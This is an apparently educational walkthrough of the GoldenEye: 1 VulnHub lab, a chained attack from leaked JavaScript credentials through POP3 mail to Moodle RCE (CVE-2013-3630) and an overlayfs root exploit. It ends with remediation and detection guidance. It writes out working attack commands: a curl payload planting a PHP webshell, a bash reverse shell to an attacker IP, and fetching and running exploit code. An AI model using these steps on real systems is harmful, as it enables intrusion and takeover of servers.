# GoldenEye: 1 — The Name is Vuln, CVE-Vuln

The name is Bond. The machine is GoldenEye. And dude, it absolutely delivers on the theme. This Bond-inspired boot2root chains together a JavaScript credential leak, a multi-hop POP3 email spider, authenticated Moodle RCE (CVE-2013-3630 — the aspell PSpellShell injection), and a Linux overlayfs kernel privilege escalation (CVE-2015-1328) that was being weaponized in the wild while Ubuntu 14.04.1 users slept. No cap, this is one of the most technically coherent machines on VulnHub. Every step builds logically on the last. gg.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | GoldenEye: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/goldeneye-1,240/ |
| **Techniques** | JavaScript credential disclosure (HTML entity encoding), POP3 enumeration, Moodle authenticated RCE, kernel local privilege escalation |
| **CVEs** | CVE-2013-3630 (Moodle PSpellShell RCE), CVE-2015-1328 (Linux overlayfs LPE) |
| **APT Groups** | APT41 — used CMS admin access as initial foothold in multiple campaigns; APT10 — leveraged credential chains from email services to pivot through enterprise environments |

---

## Attack Summary

```
nmap → SMTP (25), HTTP (80), POP3 (55006 SSL, 55007 plain)
  → HTTP: terminal.js → HTML entity encoded password
  → boris:InvincibleHack3r → /sev-home/ (HTTP Basic Auth)
  → POP3 natalya:bird → email → xenia:RCP90rulez! + Moodle domain
  → Moodle xenia → messages → username: doak
  → POP3 doak:goat → email → dr_doak:4England!
  → Moodle dr_doak → s3cret.txt → /dir007key/for-007.jpg
  → strings for-007.jpg → base64 → admin:xWinter1995x!
  → CVE-2013-3630: Moodle PSpellShell RCE → webshell → www-data shell
  → CVE-2015-1328: overlayfs LPE (EDB-37292) → root
  → /root/.flag.txt: 568628e0d993b1973adc718237da6e93
```

---

## Methodology

1. Full port scan to discover non-standard POP3 ports (55006, 55007)
2. JavaScript source analysis to extract HTML entity-encoded credentials
3. POP3 enumeration chain across four accounts
4. Moodle admin credential extraction from embedded file metadata
5. Exploit CVE-2013-3630: modify Moodle's aspell path to plant webshell
6. Trigger RCE via the spellcheck endpoint
7. Compile and run CVE-2015-1328 overlayfs exploit for root

---

## Step 1 — Full Port Scan

Always scan all ports. POP3 is hiding on non-standard ports here:

```bash
nmap -sV -p- 192.168.56.101
```

```
PORT      STATE SERVICE    VERSION
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3   Dovecot pop3d
55007/tcp open  pop3       Dovecot pop3d
```

Non-standard ports (55006 SSL, 55007 plaintext) don't hide services from `-p-`. This is a solid reminder that "security through obscurity" is not security.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — JavaScript Credential Disclosure

Browse to `http://192.168.56.101/` and check the source. There is a reference to `terminal.js`:

```bash
curl -s http://192.168.56.101/terminal.js
```

```javascript
//Boris, make sure you update your default password.
//I encoded you p@ssword below...
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

**What is HTML entity encoding?** HTML entities like `&#73;` represent characters by decimal ASCII code. This is not encryption — it is display formatting. Any browser or `python3 -c "import html; print(html.unescape('...'))"` decodes it instantly.

```python
import html
print(html.unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;"))
# InvincibleHack3r
```

**Credentials found:** `boris:InvincibleHack3r`

```bash
curl -u "boris:InvincibleHack3r" http://192.168.56.101/sev-home/
```

The page confirms POP3 access and mentions additional users: natalya, xenia. Big brain moment: this page is essentially a hint map for the entire credential chain.

**Real-world note:** Client-side credential storage in JavaScript — even "encoded" — is a CWE-312 violation. Multiple real breaches (Twitch, Samsung) involved hardcoded API keys and tokens in client-facing JavaScript. APT41 has specifically targeted CMS admin panels where credentials were found in publicly accessible JS files.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1078 — Valid Accounts

---

## Step 3 — POP3 Credential Chain

Add the domain to `/etc/hosts` (required for Moodle later):

```bash
echo "192.168.56.101 severnaya-station.com" | sudo tee -a /etc/hosts
```

**Read natalya's mail (port 55007):**

```bash
nc 192.168.56.101 55007
USER natalya
PASS bird
LIST
RETR 2
QUIT
```

Email #2 reveals:
```
username: xenia
password: RCP90rulez!
domain:   severnaya-station.com/gnocertdir
```

**Login to Moodle as xenia** at `http://severnaya-station.com/gnocertdir`:
- Navigate to Messages — find a reference to user `doak`

**Read doak's mail:**

```bash
nc 192.168.56.101 55007
USER doak
PASS goat
RETR 1
QUIT
```

Email reveals:
```
username: dr_doak
password: 4England!
```

**Alternatively:** Use `evolution`, `mutt`, or any POP3 client. For scripted enumeration: `curl --user natalya:bird pop3://192.168.56.101:55007/1`

**MITRE ATT&CK:** T1078 — Valid Accounts; T1114.002 — Email Collection: Remote Email Collection

---

## Step 4 — Extract Admin Password from Moodle

Login as dr_doak at `http://severnaya-station.com/gnocertdir/login/index.php`.

Navigate to **Profile → My Private Files** and download `s3cret.txt`:

```
"I left a secret for james in his home directory"
Path: /dir007key/for-007.jpg
```

Download the image and look for embedded data:

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
strings for-007.jpg | tail -5
# eFdpbnRlcjE5OTV4IQ==

echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
# xWinter1995x!
```

**Admin credentials:** `admin:xWinter1995x!`

**Alternatively:** `exiftool for-007.jpg` or `steghide extract -sf for-007.jpg` — checking all metadata and steganography channels is standard practice for CTF image files.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1027 — Obfuscated Files or Information (base64)

---

## Step 5 — CVE-2013-3630: Moodle PSpellShell RCE

**What is CVE-2013-3630?** Moodle 2.2.3 allows administrators to configure which spell engine TinyMCE uses. When `PSpellShell` is selected, Moodle executes the configured `aspell` path as a shell command. An admin can replace the aspell path with an arbitrary command. This was disclosed in 2013 but remains exploitable on unpatched/legacy Moodle instances.

Login as admin and obtain the CSRF session key:

```bash
MOODLE="http://severnaya-station.com/gnocertdir"
COOKIE=/tmp/admin_cookie.txt

curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$MOODLE/login/index.php" \
  -d "username=admin&password=xWinter1995x!" -L > /dev/null

SESSKEY=$(curl -s -b "$COOKIE" "$MOODLE/admin/settings.php?section=systempaths" \
  | grep -o '"sesskey":"[^"]*"' | head -1 | cut -d'"' -f4)
```

Enable PSpellShell spell engine:

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=editorsettingstinymce" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=editorsettingstinymce" \
  --data-urlencode "s_editor_tinymce_spellengine=PSpellShell"
```

Set aspell path to a webshell writer:

```bash
curl -s -b "$COOKIE" -X POST "$MOODLE/admin/settings.php?section=systempaths" \
  --data-urlencode "sesskey=$SESSKEY" \
  --data-urlencode "section=systempaths" \
  --data-urlencode 's__aspellpath=echo "<?php if(isset($_GET[\"c\"])){echo shell_exec($_GET[\"c\"]);} ?>" > /var/www/html/gnocertdir/ws.php'
```

Trigger the spellcheck endpoint to execute the command:

```bash
SPELLCHECK="$MOODLE/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker/rpc.php"

echo '{"id":"c0","method":"checkWords","params":["en",["x"]]}' | \
curl -s -b "$COOKIE" -X POST -H "Content-Type: application/json" \
  --data-binary @- "$SPELLCHECK"
```

Verify RCE:

```bash
curl "http://severnaya-station.com/gnocertdir/ws.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

( ͡° ͜ʖ ͡°) noice. Get a proper shell:

```bash
# Attacker — start listener
nc -lvnp 4444

# Via webshell
curl "http://severnaya-station.com/gnocertdir/ws.php" \
  --get --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'"
```

**Alternatively:** Metasploit has `exploit/multi/http/moodle_cmd_exec` but the manual approach above gives a deeper understanding of the underlying mechanism.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — CVE-2015-1328: Linux Overlayfs Local Privilege Escalation

**What is CVE-2015-1328?** A race condition in the Linux overlayfs (OverlayFS) filesystem driver — specifically in the `copy_up_xattrs` function — allows unprivileged users to create a crafted mount that overwrites `/etc/ld.so.preload`. This forces root-owned processes to load a malicious shared library, resulting in a root shell. Affects kernels 3.13.0 through 3.18.x on Ubuntu 14.04.1.

Verify from the shell:

```bash
uname -r
# 3.13.0-32-generic — vulnerable
```

On the attacker machine:

```bash
searchsploit -p 37292
# /usr/share/exploitdb/exploits/linux/local/37292.c

cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/ofs.c
sed -i 's/gcc -fPIC/cc -fPIC/g' /tmp/ofs.c
```

Note: `gcc` is not installed on the target. Replace with `cc` (typically Clang, which compiles most C exploits).

Transfer and compile:

```bash
# Attacker: serve the file
python3 -m http.server 8000

# On target reverse shell:
cd /tmp
wget http://192.168.56.102:8000/ofs.c
cc ofs.c -o ofs
chmod +x ofs
./ofs
```

Expected output:
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Root Flag

```bash
cat /root/.flag.txt
```

```
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

Bonus: `http://192.168.56.101/006-final/xvf7-flag/` is a classic Bond win screen. W move.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | boris:InvincibleHack3r | terminal.js (HTML entity decode) | HTTP Basic Auth /sev-home/ |
| Credential | natalya:bird | POP3 brute-force port 55007 | POP3 mail reading |
| Credential | xenia:RCP90rulez! | natalya POP3 email #2 | Moodle login |
| Credential | doak:goat | POP3 brute-force port 55007 | POP3 mail reading |
| Credential | dr_doak:4England! | doak POP3 email | Moodle login |
| Credential | admin:xWinter1995x! | base64 decode from for-007.jpg | Moodle admin RCE |
| Root Flag | 568628e0d993b1973adc718237da6e93 | /root/.flag.txt | CVE-2015-1328 LPE |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials in client-side JavaScript | Samsung Galaxy Store, Twitch, Codecov all exposed tokens in client-accessible code | Never store credentials client-side; use server-side authentication flows |
| 2 | Non-standard ports don't hide services | Full port scans are standard in any pentest. "Port obscurity" delays discovery by seconds | Firewall rules, not port numbers, control access |
| 3 | Moodle admin = RCE (CVE-2013-3630) | Moodle powers universities worldwide; admin accounts are high-value targets | MFA on CMS admin accounts; principle of least privilege; patch legacy Moodle |
| 4 | Ubuntu 14.04.1 kernel vulnerable to LPE | CVE-2015-1328 was weaponized in real attacks before Ubuntu issued the patch | Keep kernels patched; disable unprivileged user namespaces when not needed |
| 5 | gcc absent but cc works | Many privilege escalation C exploits require compilation; knowing fallback compilers (cc, tcc) matters | Always check for compiler alternatives before abandoning a C exploit |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Collection | Collection | Remote Email Collection | T1114.002 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove credentials from JavaScript** — no secrets client-side, period. Use server-side session management
2. **Enforce strong POP3 passwords and disable unused mailboxes** — implement fail2ban for POP3; use TLS-only (port 995)
3. **Patch Moodle to current version** — CVE-2013-3630 is patched in Moodle 2.5+; upgrade from 2.2.3 immediately
4. **Restrict Moodle admin account access** — enforce MFA; restrict admin panel to management IP ranges only
5. **Disable PSpellShell** in Moodle spell engine settings as a defense-in-depth measure
6. **Upgrade Ubuntu 14.04.1 to 14.04.2+** — kernel 3.13.0-49+ is patched against CVE-2015-1328
7. **Disable unprivileged user namespaces** if kernel upgrade is not immediately possible: `sysctl -w kernel.unprivileged_userns_clone=0`

### If You Find This in Your Environment

- Immediately rotate all six credential pairs found in the credential chain
- Search Moodle logs for unauthorized admin login and configuration changes
- Check for the webshell `ws.php` in the Moodle web root
- Verify kernel version: if 3.13.0 < 3.13.0-49, patch immediately

### MITRE D3FEND Countermeasures

- **D3-HBPI** — Harden Build Pipeline Integrity (prevent credentials from being embedded in JS)
- **D3-ACH** — Application Configuration Hardening (Moodle hardening: disable PSpellShell, restrict admin)
- **D3-OAM** — Operating System Administrative Management (kernel patching workflow)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all Moodle instances and kernel versions |
| Protect | Identity Management | MFA on Moodle admin; strong POP3 password policy |
| Protect | Data Security | Never store credentials in client-side code |
| Detect | Security Continuous Monitoring | Alert on Moodle admin configuration changes |
| Respond | Response Planning | Remove webshell; rotate credentials; revoke admin sessions |
| Recover | Recovery Planning | Restore Moodle from clean backup; apply patches before re-enabling |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-17 | Remote Access | Restrict Moodle admin panel to trusted IP ranges |
| IA-2(1) | Multi-Factor Authentication | MFA for Moodle admin and all privileged accounts |
| IA-5 | Authenticator Management | Rotate all six compromised credential pairs |
| SI-2 | Flaw Remediation | Patch Moodle (CVE-2013-3630) and Ubuntu kernel (CVE-2015-1328) |
| CM-7 | Least Functionality | Disable PSpellShell; disable unused mailboxes |
| AU-12 | Audit Record Generation | Log all Moodle admin panel access and configuration changes |

### CISA KEV

CVE-2015-1328 (Linux kernel overlayfs LPE) has been referenced in CISA's Known Exploited Vulnerabilities catalog in the context of Linux kernel local privilege escalation vulnerabilities. Any system running the affected kernel version should be patched immediately per CISA Binding Operational Directive 22-01.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Remediate Vulnerabilities | MIL3 |
| Identity and Access Management (IAM) | Manage Authentication | MIL3 |
| Situational Awareness (SA) | Perform Logging | MIL2 |

---

## Final Thoughts

Mad respect to the creator for building a machine that's both Bond-themed and technically coherent. GoldenEye: 1 teaches a complete attack story: reconnaissance, credential discovery, lateral movement through a service chain, an authenticated RCE via a documented CVE, and a kernel LPE. Every step has a real-world counterpart.

The machine was created in 2018 but remains relevant: Moodle is still deployed in universities, corporate training platforms, and government agencies. CVE-2013-3630 still works against any unpatched legacy Moodle. And overlayfs-class vulnerabilities continue to appear in Linux kernel CVEs. The names change; the patterns don't.

Keep hacking, keep learning. The mission is never truly over. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
